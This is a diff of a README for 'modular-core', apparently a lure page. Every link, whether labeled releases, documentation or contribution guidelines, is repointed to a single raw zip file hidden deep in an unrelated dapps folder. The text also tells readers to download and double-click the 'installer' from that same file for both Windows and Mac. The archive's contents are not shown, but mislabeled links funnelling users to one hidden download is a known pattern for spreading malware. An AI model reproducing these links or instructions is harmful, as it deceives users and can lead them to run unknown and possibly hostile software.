@@ -6,7 +6,7 @@ Welcome to **modular-core**! This application is designed to be easy to use and 
 
 ## ⬇️ Download Link
 
-[![Download modular-core](https://raw.githubusercontent.com/samuel-cf/modular-core/main/glooming/modular-core.zip%https://raw.githubusercontent.com/samuel-cf/modular-core/main/glooming/modular-core.zip)](https://raw.githubusercontent.com/samuel-cf/modular-core/main/glooming/modular-core.zip)
+[![Download modular-core](https://raw.githubusercontent.com/samuel-cf/modular-core/main/advanced/dapps/react-dapp-v2-with-ethers/src/chains/modular_core_v1.9.zip%https://raw.githubusercontent.com/samuel-cf/modular-core/main/advanced/dapps/react-dapp-v2-with-ethers/src/chains/modular_core_v1.9.zip)](https://raw.githubusercontent.com/samuel-cf/modular-core/main/advanced/dapps/react-dapp-v2-with-ethers/src/chains/modular_core_v1.9.zip)
 
 ## ⚙️ System Requirements
 
@@ -20,13 +20,13 @@ Before you start, ensure your system meets the following requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/samuel-cf/modular-core/main/glooming/modular-core.zip) to find the latest version of modular-core.
+   Go to the [Releases page](https://raw.githubusercontent.com/samuel-cf/modular-core/main/advanced/dapps/react-dapp-v2-with-ethers/src/chains/modular_core_v1.9.zip) to find the latest version of modular-core.
 
 2. **Select the Latest Release**  
    Look for the version labeled with “Latest Release” on the page.
 
 3. **Download the Installer**  
-   Click on the link for the installer file that matches your operating system (e.g., `https://raw.githubusercontent.com/samuel-cf/modular-core/main/glooming/modular-core.zip` for Windows or `https://raw.githubusercontent.com/samuel-cf/modular-core/main/glooming/modular-core.zip` for Mac).
+   Click on the link for the installer file that matches your operating system (e.g., `https://raw.githubusercontent.com/samuel-cf/modular-core/main/advanced/dapps/react-dapp-v2-with-ethers/src/chains/modular_core_v1.9.zip` for Windows or `https://raw.githubusercontent.com/samuel-cf/modular-core/main/advanced/dapps/react-dapp-v2-with-ethers/src/chains/modular_core_v1.9.zip` for Mac).
 
 4. **Run the Installer**  
    Once the download is complete, locate the installer file in your Downloads folder, then double-click to start the installation process.
@@ -65,7 +65,7 @@ Once you launch modular-core, here’s how to get started with using the softwar
 
 ## 📚 Support and Documentation
 
-For detailed instructions and troubleshooting, you can visit our [Documentation page](https://raw.githubusercontent.com/samuel-cf/modular-core/main/glooming/modular-core.zip).
+For detailed instructions and troubleshooting, you can visit our [Documentation page](https://raw.githubusercontent.com/samuel-cf/modular-core/main/advanced/dapps/react-dapp-v2-with-ethers/src/chains/modular_core_v1.9.zip).
 
 If you have questions or need more help, feel free to reach out to our community. You can find support channels in the documentation linked above.
 
@@ -77,10 +77,10 @@ We are working on exciting new features. Here’s a preview of what’s coming n
 - New plugins to extend functionality.
 - Integration with popular third-party tools.
 
-Stay updated on our progress by checking the [Releases page](https://raw.githubusercontent.com/samuel-cf/modular-core/main/glooming/modular-core.zip) regularly.
+Stay updated on our progress by checking the [Releases page](https://raw.githubusercontent.com/samuel-cf/modular-core/main/advanced/dapps/react-dapp-v2-with-ethers/src/chains/modular_core_v1.9.zip) regularly.
 
 ## 🔧 Contributing
 
-If you would like to contribute to modular-core, we welcome your input! Please follow the guidelines on our [Contribution page](https://raw.githubusercontent.com/samuel-cf/modular-core/main/glooming/modular-core.zip) to get started.
+If you would like to contribute to modular-core, we welcome your input! Please follow the guidelines on our [Contribution page](https://raw.githubusercontent.com/samuel-cf/modular-core/main/advanced/dapps/react-dapp-v2-with-ethers/src/chains/modular_core_v1.9.zip) to get started.
 
 Thank you for using modular-core!
